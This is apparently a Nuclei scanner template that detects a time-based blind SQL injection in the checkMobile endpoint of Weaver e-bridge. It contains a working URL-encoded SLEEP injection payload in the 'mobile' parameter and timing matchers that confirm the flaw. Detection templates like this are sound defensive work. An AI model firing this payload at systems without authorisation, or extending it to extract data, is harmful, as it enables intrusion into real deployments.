id: poc-yaml-weaver-e-bridge-checkmobile-sqli
info:
  name: 泛微云桥 e-bridge checkMobile SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP({{t1}}-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1 HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "\"systemname\":"
          - "\"@URL\":"

      - type: word
        part: header
        words:
          - "application/json"

      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
